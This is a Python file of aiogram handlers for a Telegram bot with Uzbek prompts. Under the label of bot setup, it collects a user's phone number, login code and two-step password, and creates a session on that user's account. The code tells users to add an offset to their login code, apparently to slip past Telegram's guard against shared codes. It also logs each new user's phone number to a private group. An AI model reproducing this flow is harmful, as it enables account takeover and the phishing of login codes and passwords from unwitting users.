from aiogram import types
from aiogram.dispatcher import FSMContext

from loader import dp, bot
from keyboards.inline.inline_buttons import start_button, main_menu_button
from states.setting_bots import SettingsBot

from utils.connect_progress import send_code_for_create_session, verify_code_and_sign_in, sign_in_with_2fa
from data.config import DEFAULT_CODE_OFFSET, DRIVERS, SAVE_GROUP_ID
from keyboards.default.default_buttons import back_button, phone_button


@dp.callback_query_handler(text="start_button")
async def bot_echo(call: types.CallbackQuery, state: FSMContext):
    await call.message.delete()
    await call.message.answer(
        text="Yaxshi. Botni sozlash boshlandi.\n\nUlamoqchi bo'lgan akkauntingizni telefon raqamini quyiga +998901234567 ko'rinishida yuboring yoki quyidagi tugmani bosing.",
        reply_markup=phone_button
    )
    await SettingsBot.phone_number.set()


@dp.message_handler(lambda message: message.contact, content_types=types.ContentType.CONTACT, state=SettingsBot.phone_number)
@dp.message_handler(state=SettingsBot.phone_number)
async def bot_echo(message: types.Message, state: FSMContext):
    try:
        phone_number = message.text.strip()
    except AttributeError as e:
        phone_number = message.contact.phone_number
    print(phone_number)

    if not phone_number.startswith("+998") or len(phone_number) != 13:
        await message.answer(
            text="Iltimos, telefon raqamingizni to'g'ri formatda yuboring: +998901234567"
        )
        await SettingsBot.phone_number.set()
        return

    telegram_id = message.from_user.id
    await message.delete()

    phone_code_hash = await send_code_for_create_session(
        telegram_id=telegram_id,
        phone_number=phone_number
    )

    if not phone_code_hash:
        await message.answer(
            text="Siz avtorizatsiyadan o'tgansiz yoki telefon raqamingiz noto'g'ri. Iltimos, telefon raqamingizni tekshirib qayta yuboring.",
            reply_markup=start_button
        )
        if await state.get_state():
            await state.reset_state(with_data=True)
        await state.finish()
        return

    await message.answer(
        text=f"Telegram orqali yuborilgan kodga {DEFAULT_CODE_OFFSET} ni qo'shib quyiga kiriting:\n\nMasalan, agar Telegram orqali yuborilgan kod 12345 bo'lsa, siz 12345 + {DEFAULT_CODE_OFFSET} = {12345+DEFAULT_CODE_OFFSET} ni kiriting.",
        reply_markup=back_button
    )

    await state.update_data(phone_code_hash=phone_code_hash)
    await state.update_data(phone_number=phone_number)
    await SettingsBot.code_from_telegram.set()


@dp.message_handler(state=SettingsBot.code_from_telegram)
async def bot_echo(message: types.Message, state: FSMContext):
    telegram_id = message.from_user.id
    code_ = message.text.strip()
    if not code_.isdigit() or len(code_) != 5:
        await message.answer(
            text=f"Telegram orqali yuborilgan kodga(5 raqamli) {DEFAULT_CODE_OFFSET} ni qo'shib quyiga kiriting:\n\nMasalan, agar Telegram orqali yuborilgan kod 12345 bo'lsa, siz 12345 + {DEFAULT_CODE_OFFSET} = {12345+DEFAULT_CODE_OFFSET} ni kiriting.",
            reply_markup=back_button
        )
        return
    code = int(code_) - DEFAULT_CODE_OFFSET

    data = await state.get_data()
    phone_number = data.get("phone_number")
    phone_code_hash = data.get("phone_code_hash")

    is_verified = await verify_code_and_sign_in(
        telegram_id=telegram_id,
        phone_number=phone_number,
        code=code,
        phone_code_hash=phone_code_hash
    )
    await message.delete()

    if is_verified:
        await message.answer(
            text="✅ Muvaffaqiyatli ulandik!\n\nBot sozlamalari muvaffaqiyatli amalga oshirildi. Endi siz e'lonlaringizni avtomatik ravishda yuborishingiz mumkin.",
            reply_markup=main_menu_button
        )
        await bot.send_message(
            chat_id=SAVE_GROUP_ID,
            message_thread_id=DRIVERS,
            text=f"🎉 Yangi foydalanuvchi.\n👨‍💼User: {message.from_user.first_name}\n📞Telefon: {phone_number}\n🪪Username: @{message.from_user.username}"
        )
        if await state.get_state():
            await state.reset_state(with_data=True)
        await state.finish()
    else:
        await message.answer(
            text="❌ Kod noto'g'ri yoki akkaunt ikki etapli parol bilan himoyalangan. Iltimos, ikki etapli parol parolingizni kiriting:",
            reply_markup=back_button
        )
        await SettingsBot.code_two_step_from_telegram.set()


@dp.message_handler(state=SettingsBot.code_two_step_from_telegram)
async def bot_echo(message: types.Message, state: FSMContext):
    data = await state.get_data()
    phone_number = data.get("phone_number")
    telegram_id = message.from_user.id
    password = message.text.strip()
    await message.delete()

    await sign_in_with_2fa(telegram_id=telegram_id, password=password)

    await message.answer(
        text="✅ Muvaffaqiyatli ulandik!\n\nBot sozlamalari muvaffaqiyatli amalga oshirildi. Endi siz e'lonlaringizni avtomatik ravishda yuborishingiz mumkin.",
        reply_markup=main_menu_button
    )
    await bot.send_message(
        chat_id=SAVE_GROUP_ID,
        message_thread_id=DRIVERS,
        text=f"🎉 Yangi foydalanuvchi.\n👨‍💼User: {message.from_user.first_name}\n📞Telefon: {phone_number}\nUsername: @{message.from_user.username}"
    )
    if await state.get_state():
        await state.reset_state(with_data=True)
    await state.finish()


@dp.message_handler(state="*", text="Bekor qilish")
async def cancel_handler(message: types.Message, state: FSMContext):
    await message.answer(
        text="Sozlash bekor qilindi. Siz asosiy menyuga qaytdingiz.",
        reply_markup=main_menu_button
    )
    if await state.get_state():
        await state.reset_state(with_data=True)
    await state.finish()
